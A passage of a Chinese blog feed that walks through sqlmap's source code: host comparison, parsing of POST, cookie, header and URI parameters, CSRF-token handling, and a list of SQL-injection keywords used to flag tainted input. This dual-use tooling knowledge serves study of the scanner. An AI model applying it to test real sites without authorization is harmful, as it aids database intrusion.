        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-checkSameHost函数的疑问</title>
    <url>//63018.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在看sqlmap源码的时候,看了它的<code>crawler</code>，用到了<code>checkSameHost</code>函数.</p>
<p>跟进到<code>lib.core.common</code>公共函数里看<code>checkSameHost</code>函数,产生了一些疑问</p>
<hr>
<h1 id="checkSameHost函数"><a href="#checkSameHost函数" class="headerlink" title="checkSameHost函数:"></a>checkSameHost函数:</h1><h2 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h2><p>用来判断一堆urls是否是相同主机的.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSameHost</span>(<span class="params">*urls</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Returns True if all provided urls share that same host</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; checkSameHost(&#x27;http://www.target.com/page1.php?id=1&#x27;, &#x27;http://www.target.com/images/page2.php&#x27;)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; checkSameHost(&#x27;http://www.target.com/page1.php?id=1&#x27;, &#x27;http://www.target2.com/images/page2.php&#x27;)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 用了*urls可以接受任意数量的参数,并放入tuple里,由于不知道传入url的个数是多少,所以要适当的进行判断</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> urls:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(urls) == <span class="number">1</span>: <span class="comment"># 1个url不用判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_</span>(<span class="params">value</span>): <span class="comment"># _ 这个用法应该是匿名函数的意思吧?</span></span><br><span class="line">            <span class="keyword">if</span> value <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\A\w+://&quot;</span>, value):</span><br><span class="line">                <span class="comment"># \A 文本开头</span></span><br><span class="line">                <span class="comment"># \w匹配英文字母、数字或下划线，等价于[a-zA-Z0-9_]。</span></span><br><span class="line">                <span class="comment"># + 量词 — 匹配 1 至 无穷 次</span></span><br><span class="line">                <span class="comment"># :// 字面匹配字符</span></span><br><span class="line">                value = <span class="string">&quot;http://%s&quot;</span> % value <span class="comment"># 没有协议的话自动加上http协议.这个判断可用来处理输入时有没带协议的情况,方便urlparse.urlparse函数进行解析</span></span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">all</span>(re.sub(<span class="string">r&quot;(?i)\Awww\.&quot;</span>, <span class="string">&quot;&quot;</span>, urlparse.urlparse(_(url) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) == re.sub(</span><br><span class="line">                <span class="string">r&quot;(?i)\Awww\.&quot;</span>, <span class="string">&quot;&quot;</span>, urlparse.urlparse(_(urls[<span class="number">0</span>]) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) <span class="keyword">for</span> url <span class="keyword">in</span> urls[<span class="number">1</span>:])</span><br><span class="line">                    <span class="comment"># all(iterable) Return True if all elements of the iterable are true (or if the iterable is empty)</span></span><br><span class="line">                    <span class="comment"># urlparse.urlparse(_(url) or &quot;&quot;).netloc.split(&#x27;:&#x27;)[0] 域名服务器</span></span><br><span class="line">                    <span class="comment"># 正则表达式 r&quot;(?i)\Awww\.&quot; (?!) Assert that the Regex below does not match</span></span><br><span class="line">                    <span class="comment"># www.开头的域名,www.baidu.com会被处理成baidu.com</span></span><br><span class="line">                    <span class="comment"># 遍历看,通过域名判断是否是sameHost</span></span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h2><ul>
<li><p><code>http://www.target.com/page1.php?id=1</code>, <code>http://www.target.com/images/page2.php</code></p>
<ul>
<li><code>True</code></li>
</ul>
</li>
<li><p><code>http://www.target.com/page1.php?id=1</code>, <code>http://www.target2.com/images/page2.php</code></p>
<ul>
<li><code>False</code></li>
</ul>
</li>
<li><p><code>http://xxx.com</code>,<code>http://www.xxx.com</code></p>
<ul>
<li><code>True</code></li>
</ul>
</li>
<li><p><code>http://aa.xxx.com</code>,<code>http://bb.xxx.com</code></p>
<ul>
<li><code>False</code></li>
<li>?????</li>
</ul>
</li>
</ul>
<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问:"></a>疑问:</h2><p>很多时候,<code>http://aa.xxx.com</code>,<code>http://bb.xxx.com</code>这两个子域名是可以解析同一个ip上的,这种情况下<code>sameHost</code>判断应该为<code>True</code>才对,为什么这里为<code>False</code>呢?</p>
<h2 id="answer"><a href="#answer" class="headerlink" title="answer:"></a>answer:</h2><p>这里的sameHost应该是有歧义<br>严格意义上,是否是sameHost应该通过ip来判断,但是如果url很多的话,都去其解析域名对应的ip,会消耗时间</p>
<p>广义上看,这里的sameHost应该指的是same website.</p>
<p>通过域名来判断是否是相同的网站,是ok的.</p>
<hr>
<h1 id="域名与ip的关系"><a href="#域名与ip的关系" class="headerlink" title="域名与ip的关系:"></a>域名与ip的关系:</h1><p>常见的情况下,一个域名与一个ip是对应的.</p>
<p>但是<strong>域名与ip的关系不一定是一对一的关系,可以是多对一或者是一对多的关系</strong>.</p>
<ul>
<li><p>多个域名解析到一个ip:</p>
<ul>
<li><a href="https://jingyan.baidu.com/article/a24b33cd55c7ba19ff002b4b.html">IIS中怎么配置虚拟主机</a></li>
<li><a href="https://segmentfault.com/q/1010000002442790">IS可否将多个域名配置到同一个IP&#x2F;端口</a></li>
</ul>
</li>
<li><p>一个域名解析到多个ip:</p>
<ul>
<li><a href="https://www.cnblogs.com/cuihongyu3503319/archive/2012/07/09/2583129.html">负载均衡实现，一个域名对应多个IP地址</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-请求参数的检验和解析(一)</title>
    <url>//59037.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们平时在使用sqlmap的时候,</p>
<p>一般会直接这样使用:<code>sqlmap -u http://sqlilabs:8888/Less-1/?id=1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[10:18:54] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span><br><span class="line">[10:18:54] [INFO] confirming that GET parameter &#x27;id&#x27; is dynamic</span><br><span class="line">[10:18:54] [INFO] GET parameter &#x27;id&#x27; is dynamic</span><br></pre></td></tr></table></figure>

<p>这个时候,sqlmap会自动识别到get请求的有可测试参数<code>id</code><br>那么,sqlmap是如何解析到这个参数的呢?</p>
<p>重点讲解一下<code>target.py</code>下的解析请求参数函数<code>_setRequestParams()</code></p>
<h1 id="setRequestParams-函数"><a href="#setRequestParams-函数" class="headerlink" title="_setRequestParams()函数"></a>_setRequestParams()函数</h1><h2 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明:"></a>函数说明:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check and set the parameters and perform checks on &#x27;data&#x27; option for</span></span><br><span class="line"><span class="string">    HTTP method POST. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>对请求的参数进行检验和解析.</p>
<p>这个函数是在sqlmap测试前的目标准备时做的工作.</p>
<p>可参考一下,<a href="https://zhuanlan.zhihu.com/p/43242220">sqlmap 内核分析 I: 基础流程</a></p>
<hr>
<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图:"></a>流程图:</h2><p><img src="https://i.loli.net/2019/08/28/tcHEIpybSNujUT2.jpg"></p>
<blockquote>
<p>画图真累人…</p>
</blockquote>
<p>由于代码量实在有点多,下面只能挑一些重点的来讲</p>
<hr>
<h2 id="匹配并解析Post数据"><a href="#匹配并解析Post数据" class="headerlink" title="匹配并解析Post数据:"></a>匹配并解析Post数据:</h2><p><img src="https://i.loli.net/2019/08/28/4XiDBCEASfw2x1v.jpg"></p>
<p><code>sqlmap</code>支持这五种数据类型</p>
<ul>
<li>XML</li>
<li>JSON</li>
<li>JSON_LIKE</li>
<li>MULTIPART</li>
<li>ARRAY_LIKE</li>
</ul>
<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配:"></a>正则匹配:</h3><p>通过<strong>正则匹配</strong>这五种类型的数据,它们的正则表达式为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Regular expression for XML POST data</span></span><br><span class="line">XML_RECOGNITION_REGEX = <span class="string">r&quot;(?s)\A\s*&lt;[^&gt;]+&gt;(.+&gt;)?\s*\Z&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting JSON POST data</span></span><br><span class="line">JSON_RECOGNITION_REGEX = <span class="string">r&#x27;(?s)\A(\s*\[)*\s*\&#123;.*&quot;[^&quot;]+&quot;\s*:\s*(&quot;[^&quot;]*&quot;|\d+|true|false|null).*\&#125;\s*(\]\s*)*\Z&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting JSON-like POST data</span></span><br><span class="line">JSON_LIKE_RECOGNITION_REGEX = <span class="string">r&quot;(?s)\A(\s*\[)*\s*\&#123;.*&#x27;[^&#x27;]+&#x27;\s*:\s*(&#x27;[^&#x27;]+&#x27;|\d+).*\&#125;\s*(\]\s*)*\Z&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting multipart POST data</span></span><br><span class="line">MULTIPART_RECOGNITION_REGEX = <span class="string">r&quot;(?i)Content-Disposition:[^;]+;\s*name=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting Array-like POST data</span></span><br><span class="line">ARRAY_LIKE_RECOGNITION_REGEX = <span class="string">r&quot;(\A|%s)(\w+)\[\]=.+%s\2\[\]=&quot;</span> % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)</span><br></pre></td></tr></table></figure>

<h3 id="解析"><a href="#解析" class="headerlink" title="解析:"></a>解析:</h3><p>以解析json数据为例,</p>
<p><img src="https://i.loli.net/2019/08/28/wtYPzdE9TKfQXZc.jpg"></p>
<p>关键是这3个正则表达式,分别解析3种模式的数据</p>
<p>简单理解为:</p>
<ul>
<li>模式<code>&quot;&quot;:&quot;&quot;</code></li>
<li>模式<code>&quot;&quot;:数字</code></li>
<li>模式<code>&quot;&quot;:true false null类型</code></li>
</ul>
<p>然后调用<code>process()</code>去解析出它的<code>参数名</code>和<code>整个参数</code>.</p>
<p><img src="https://i.loli.net/2019/08/28/yE3h29wS4ibY7G8.jpg"></p>
<p>解析到的数据会添加到<code>hintNames列表</code></p>
<p>举2个实例方便理解.</p>
<h3 id="例子1-json数据"><a href="#例子1-json数据" class="headerlink" title="例子1:json数据"></a>例子1:json数据</h3><p>比如现在有一段json数据.</p>
<p><img src="https://i.loli.net/2019/08/28/T7bmUAf3IpM5co9.jpg"></p>
<p>经过解析后:</p>
<p><img src="https://i.loli.net/2019/08/28/sWjDgcXxN4O6YVH.jpg"></p>
<p>简单的说就是,经过解析处理后,整段的json数据已经分割开来了,变成了一个个<strong>可测试的参数</strong></p>
<h3 id="例子2-MULTIPART数据"><a href="#例子2-MULTIPART数据" class="headerlink" title="例子2:MULTIPART数据:"></a>例子2:MULTIPART数据:</h3><p>比如现在有一段MULTIPART类型的数据.</p>
<p><img src="https://i.loli.net/2019/08/28/cEn4RwWdaOiKMCj.jpg"></p>
<p>经过解析后，也变成了一个可测试的参数.</p>
<p><img src="https://i.loli.net/2019/08/28/nYZNQceMXvaWois.jpg"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p>sqlmap会尽可能找出你的Post数据中<strong>所有可测试参数</strong>.</p>
<hr>
<h2 id="URI注入"><a href="#URI注入" class="headerlink" title="URI注入:"></a>URI注入:</h2><p><img src="https://i.loli.net/2019/08/28/w7KulXg9TW3AILv.jpg"></p>
<p><img src="https://i.loli.net/2019/08/28/zX3Ga42xeBpt5R7.jpg"></p>
<p>通过正则匹配<code>url</code>是否符合<code>uri注入</code>的模式.</p>
<p>正则表达式:<code>r&quot;//[^/]*/([^\.*?]+)\Z&quot;</code></p>
<p>符合的情况:</p>
<ul>
<li><code>http://www.site.com/id82</code></li>
<li><code>http://www.site.com/article</code></li>
</ul>
<p>不符合的情况:</p>
<ul>
<li><code>http://www.qqq.com</code></li>
<li><code>http://www.site.com/article.php?id=1</code></li>
</ul>
<p>如果符合<code>uri注入</code>的模式,会提示你是否尝试进行<code>uri注入</code></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结:"></a>总结:</h3><p>我之前简单以为<code>url</code>有参数才存在注入的可能性.</p>
<p>其实,<strong>url并非一定要带参数才有可能存在注入的,只要跟数据库交互的地方都有可能存在sqli.</strong></p>
<p>refs:<a href="https://www.secpulse.com/archives/49018.html">同花顺某站一处URI注入</a></p>
<p><img src="https://i.loli.net/2019/08/28/BAprsZDNHaKjPqz.jpg"></p>
<hr>
<h2 id="解析cookie"><a href="#解析cookie" class="headerlink" title="解析cookie:"></a>解析cookie:</h2><p><img src="https://i.loli.net/2019/08/28/JMjVPST9nOByQUf.jpg"></p>
<p>解析<code>cookie</code>会调用到<code>paramToDict()</code>这个函数(把参数转换为可测试参数字典),这个函数也是个大函数,就不具体讲了.可能要写一篇文章才会详细讲到.</p>
<p>比较重要的点有,<strong>一般会用<code>;</code>符号去分割解析<code>cookie</code>里面的参数.</strong></p>
<p><img src="https://i.loli.net/2019/08/28/eUmhpauV8rtE2Mx.jpg"></p>
<p>然后形成可测试参数列表.</p>
<blockquote>
<p>sqlmap会尽可能找出你的Post数据中<strong>所有可测试参数</strong>.cookie里的每个参数都不放过.</p>
</blockquote>
<hr>
<h2 id="解析header"><a href="#解析header" class="headerlink" title="解析header:"></a>解析header:</h2><p><img src="https://i.loli.net/2019/08/28/KliaP9SxsOIX7Wn.jpg"></p>
<p><img src="https://i.loli.net/2019/08/28/uXmTcNrst43kaI7.jpg"></p>
<p><code>header</code>中可测试的点可能有:</p>
<ul>
<li><code>user-agent</code></li>
<li><code>referer</code></li>
<li><code>host</code></li>
<li><code>cookie</code></li>
</ul>
<p>比如有一段数据:</p>
<p><img src="https://i.loli.net/2019/08/28/9VNkWtMmTFX3z7h.jpg"></p>
<p>解析后的<code>header</code>中可测试的参数为</p>
<p><img src="https://i.loli.net/2019/08/28/zoQvSrAnghPCs8u.jpg"></p>
<hr>
<h2 id="识别csrf-token"><a href="#识别csrf-token" class="headerlink" title="识别csrf-token:"></a>识别csrf-token:</h2><p><img src="https://i.loli.net/2019/08/28/nPFXazfGiUDNMoT.jpg"></p>
<p><img src="https://i.loli.net/2019/08/28/kTpLFKgwV59AQOE.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Infixes used for automatic recognition of parameters carrying anti-CSRF tokens</span></span><br><span class="line">CSRF_TOKEN_PARAMETER_INFIXES = (<span class="string">&quot;csrf&quot;</span>, <span class="string">&quot;xsrf&quot;</span>, <span class="string">&quot;token&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>尝试在<code>header</code>数据中寻找有无<code>cstf-token</code>标记的字眼,如果有认为无法注入.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> conf.csrfToken <span class="keyword">and</span> re.search(conf.csrfToken, parameter, re.I):</span><br><span class="line">    testSqlInj = <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<p>refs:<a href="https://www.360zhijia.com/360anquanke/178754.html">【技术分享】使用burp macros和sqlmap绕过csrf防护进行sql注入</a></p>
<blockquote>
<p>然而，一些像CSRF、tokens或者简单的的反自动化技术如在一个表单中包含一个隐藏值就能够阻止自动化工具正确的工作</p>
</blockquote>
<hr>
<h1 id="总结-2"><a href="#总结-2" class="headerlink" title="总结:"></a>总结:</h1><ul>
<li>sqlmap支持5种数据类型的Post数据:<code>XML</code>、<code>JSON</code>、<code>JSON_LIKE</code>、<code>MULTIPART</code>、<code>ARRAY_LIKE</code></li>
<li>sqlmap会尽可能找出你的Post数据中所有可测试参数.</li>
<li>url并非一定要带参数才有可能存在注入的,只要跟数据库交互的地方都有可能存在注入,可以考虑<code>uri注入</code></li>
<li><code>header</code>中可以测试的点为:- <code>user-agent</code>、<code>referer</code>、<code>host</code>、<code>cookie</code></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-请求参数的检验和解析(二)</title>
    <url>//9785.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>上篇,讲的解析请求参数函数<code>_setRequestParams()</code>,里面有多处会调用到<code>paramToDict()</code>函数.</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35bb65bd.jpg"></p>
<p>如图所示,会调用<code>paramToDict</code>去不同位置的参数:</p>
<ul>
<li>Get参数</li>
<li>Post参数</li>
<li>Cookie参数</li>
</ul>
<hr>
<h1 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明:"></a>函数说明:</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">paramToDict</span>(<span class="params">place, parameters=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Split the parameters into names and values, check if these parameters</span></span><br><span class="line"><span class="string">    are within the testable parameters and return in a dictionary. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>作用:</p>
<ol>
<li>将参数名和参数值分开</li>
<li>判断给的参数在不在这里面</li>
</ol>
<h1 id="paramToDict的主要流程"><a href="#paramToDict的主要流程" class="headerlink" title="paramToDict的主要流程"></a>paramToDict的主要流程</h1><h2 id="去除html编码"><a href="#去除html编码" class="headerlink" title="去除html编码"></a>去除html编码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parameters = re.sub(<span class="string">r&quot;&amp;(\w&#123;1,4&#125;);&quot;</span>, <span class="string">r&quot;%s\g&lt;1&gt;%s&quot;</span> % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), parameters)</span><br></pre></td></tr></table></figure>
<p>参数里可能会包含html编码字符,例如<code>__AMP__</code>, <code>__SEMICOLON__</code><br>如果有的话,将参数提取出来.</p>
<blockquote>
<p>算是一种优化的手段吧.</p>
</blockquote>
<h2 id="参数分隔"><a href="#参数分隔" class="headerlink" title="参数分隔"></a>参数分隔</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> place == PLACE.COOKIE:</span><br><span class="line">    splitParams = parameters.split(conf.cookieDel <span class="keyword">or</span> DEFAULT_COOKIE_DELIMITER) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    splitParams = parameters.split(conf.paramDel <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER)</span><br></pre></td></tr></table></figure>

<p>如果是<code>Cookie</code>里的参数,一般用<code>;</code>作为分隔符</p>
<blockquote>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie: gdpr-cookie-consent=accepted; _ga=GA1.2.56372231.1535340163; token=5b836e9cc3dcfa1d7812d915%2F0utWy6TvJ8pITwm1G76m7XXgrQBDY5bZ4Jfkqj9ousVXssC2hOyrDeMFs8PFtkWL;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果是<code>Get、Post</code>里的参数,一般用<code>&amp;</code>作为分隔符</p>
<blockquote>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.baidu.com/s?wd=parameter%20&amp;rsv_spt=1&amp;rsv_iqid=0x895d84b600069e8d&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8</span><br></pre></td></tr></table></figure>
</blockquote>
<p>处理后的结果为列表:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[u&#x27;wd=parameter &#x27;, u&#x27;rsv_spt=1&#x27;, u&#x27;rsv_iqid=0x895d84b600069e8d&#x27;, u&#x27;issp=1&#x27;, u&#x27;f=3&#x27;, u&#x27;rsv_bp=1&#x27;, u&#x27;rsv_idx=2&#x27;, u&#x27;ie=utf-8&#x27;]</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="对每个参数进行检验、解析"><a href="#对每个参数进行检验、解析" class="headerlink" title="对每个参数进行检验、解析"></a>对每个参数进行检验、解析</h2><h3 id="参数名和值分隔"><a href="#参数名和值分隔" class="headerlink" title="参数名和值分隔"></a>参数名和值分隔</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> splitParams:</span><br><span class="line">    element = re.sub(<span class="string">r&quot;%s(.+?)%s&quot;</span> % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), <span class="string">r&quot;&amp;\g&lt;1&gt;;&quot;</span>, element) <span class="comment"># 去除html标签</span></span><br><span class="line">    parts = element.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">        parameter = urldecode(parts[<span class="number">0</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment"># 解码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> parameter:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> conf.paramDel <span class="keyword">and</span> conf.paramDel == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            parts[-<span class="number">1</span>] = parts[-<span class="number">1</span>].rstrip()</span><br></pre></td></tr></table></figure>

<ul>
<li>参数如果含HTML标签,去掉HTML标签</li>
<li>参数名和值用<code>=</code>分隔</li>
<li><code>urldecode</code>参数名</li>
</ul>
<h3 id="判断是否满足检验的条件"><a href="#判断是否满足检验的条件" class="headerlink" title="判断是否满足检验的条件"></a>判断是否满足检验的条件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">condition = <span class="keyword">not</span> conf.testParameter</span><br><span class="line">condition |= conf.testParameter <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> parameter <span class="keyword">in</span> conf.testParameter</span><br><span class="line">condition |= place == PLACE.COOKIE <span class="keyword">and</span> <span class="built_in">len</span>(intersect((PLACE.COOKIE,), conf.testParameter, <span class="literal">True</span>)) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这个条件<code>condition</code>是并列的or判断,满足任意情况即可</p>
<ul>
<li>没有指定参数</li>
<li>指定了参数 同时 该参数在指定的参数范围里</li>
<li>该参数的位置在cookie 同时 该参数在cookie里</li>
</ul>
<hr>
<h3 id="开始检验参数值-参数值是否异常-被污染"><a href="#开始检验参数值-参数值是否异常-被污染" class="headerlink" title="开始检验参数值-参数值是否异常(被污染)"></a>开始检验参数值-参数值是否异常(被污染)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    testableParameters[parameter] = <span class="string">&quot;=&quot;</span>.join(parts[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> conf.multipleTargets <span class="keyword">and</span> <span class="keyword">not</span> (conf.csrfToken <span class="keyword">and</span> re.search(conf.csrfToken, parameter, re.I)):</span><br><span class="line">        _ = urldecode(testableParameters[parameter], convall=<span class="literal">True</span>) <span class="comment"># url解码</span></span><br><span class="line">        <span class="keyword">if</span> (_.endswith(<span class="string">&quot;&#x27;&quot;</span>) <span class="keyword">and</span> _.count(<span class="string">&quot;&#x27;&quot;</span>) == <span class="number">1</span> <span class="keyword">or</span> re.search(<span class="string">r&#x27;\A9&#123;3,&#125;&#x27;</span>, _) <span class="keyword">or</span> re.search(<span class="string">r&#x27;\A-\d+\Z&#x27;</span>, _) <span class="keyword">or</span> re.search(DUMMY_USER_INJECTION, _)) <span class="keyword">and</span> <span class="keyword">not</span> parameter.upper().startswith(GOOGLE_ANALYTICS_COOKIE_PREFIX): <span class="comment"># 正则匹配是否含异常字段</span></span><br><span class="line">            warnMsg = <span class="string">&quot;it appears that you have provided tainted parameter values &quot;</span> <span class="comment"># 提示信息</span></span><br><span class="line">            warnMsg += <span class="string">&quot;(&#x27;%s&#x27;) with most likely leftover &quot;</span> % element</span><br><span class="line">            warnMsg += <span class="string">&quot;chars/statements from manual SQL injection test(s). &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;Please, always use only valid parameter values &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;so sqlmap could be able to run properly&quot;</span></span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">            message = <span class="string">&quot;are you really sure that you want to continue (sqlmap could have problems)? [y/N] &quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> readInput(message, default=<span class="string">&#x27;N&#x27;</span>, boolean=<span class="literal">True</span>):</span><br><span class="line">                <span class="keyword">raise</span> SqlmapSilentQuitException</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> _:</span><br><span class="line">            warnMsg = <span class="string">&quot;provided value for parameter &#x27;%s&#x27; is empty. &quot;</span> % parameter</span><br><span class="line">            warnMsg += <span class="string">&quot;Please, always use only valid parameter values &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;so sqlmap could be able to run properly&quot;</span></span><br><span class="line">            logger.warn(warnMsg)</span><br></pre></td></tr></table></figure>

<p>如果同时满足以下情况:</p>
<ul>
<li>配置里不是多个检测目标</li>
<li>没有<code>cstf-token</code></li>
</ul>
<p>会尝试检测参数值是否异常(被污染)</p>
<p>url解码参数值之后,检测出以下情况则认为参数值异常(被污染)</p>
<ul>
<li>含有单引号<code>&#39;</code></li>
<li>开头有3个9或者更多 (不知道为什么)</li>
<li>含<code>-数字</code> (类似id&#x3D;2-1 这种payload吧)</li>
<li>含以下关键词<code>AND</code>、<code>OR</code>、<code>UNION</code>、<code>SELECT</code>、<code>FROM</code>、<code>CONCAT</code>、<code>information_schema</code>、<code>SLEEP</code>、<code>DELAY</code>、<code>FLOOR</code>、<code>(RAND)</code> (常见payload关键字)</li>
<li>含google分析cookie前缀<code>__UTM</code></li>
</ul>
<p>之所以要这样做异常检测,是跟后面sql注入在参数值前后插入<code>payload</code>的动作有关系的</p>
<p>如果参照值提前含有这些<code>payload</code>字眼,很可能会造成后面的异常.</p>
<p>所以它会提示你</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">are you really sure that you want to continue (sqlmap could have problems)? [y/N] </span><br></pre></td></tr></table></figure>

<hr>
<h3 id="检验Get、Post参数值"><a href="#检验Get、Post参数值" class="headerlink" title="检验Get、Post参数值"></a>检验Get、Post参数值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> place <span class="keyword">in</span> (PLACE.POST, PLACE.GET):</span><br><span class="line">    <span class="keyword">for</span> regex <span class="keyword">in</span> (<span class="string">r&quot;\A((?:&lt;[^&gt;]+&gt;)+\w+)((?:&lt;[^&gt;]+&gt;)+)\Z&quot;</span>, <span class="string">r&quot;\A([^\w]+.*\w+)([^\w]+)\Z&quot;</span>): </span><br><span class="line">        match = re.search(regex, testableParameters[parameter]) <span class="comment"># 正则匹配</span></span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="comment"># ....</span></span><br></pre></td></tr></table></figure>

<p>通过正则去检验参数值是否特殊,如含特殊的符号.</p>
<p>这两个正则的意思是:</p>
<ul>
<li>参数含有标签 (可能是xml数据)</li>
<li>参数除了有数字和字母,有其他符号 (可能是json数据)</li>
</ul>
<blockquote>
<p>这两个正则有点难理解.</p>
</blockquote>
<hr>
<h3 id="解析Get、Post参数值"><a href="#解析Get、Post参数值" class="headerlink" title="解析Get、Post参数值"></a>解析Get、Post参数值</h3><p><strong>参数值</strong>如果比较特殊,就会尝试去解析.</p>
<ul>
<li>json反序列化</li>
<li>xml解析</li>
</ul>
<h4 id="尝试json反序列化"><a href="#尝试json反序列化" class="headerlink" title="尝试json反序列化"></a>尝试json反序列化</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deserialized = json.loads(testableParameters[parameter])</span><br><span class="line">walk(deserialized)</span><br></pre></td></tr></table></figure>

<p>主要是这个walk()函数</p>
